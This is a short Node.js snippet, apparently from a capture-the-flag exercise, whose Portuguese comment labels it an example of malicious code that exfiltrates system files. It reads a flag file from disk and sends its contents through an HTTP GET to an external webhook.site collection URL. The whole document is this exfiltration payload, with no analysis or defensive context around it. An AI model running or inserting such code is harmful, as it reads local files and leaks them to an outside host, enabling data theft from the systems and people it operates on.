const fs = require('fs');
const http = require('http');

// Exemplo de código malicioso que exfiltra arquivos do sistema
const flag = fs.readFileSync('/path/to/flag.txt', 'utf8');
http.get(`https://webhook.site/1ce3d6ce-eb0a-4365-b862-68cac4749bcf?data=${encodeURIComponent(flag)}`);
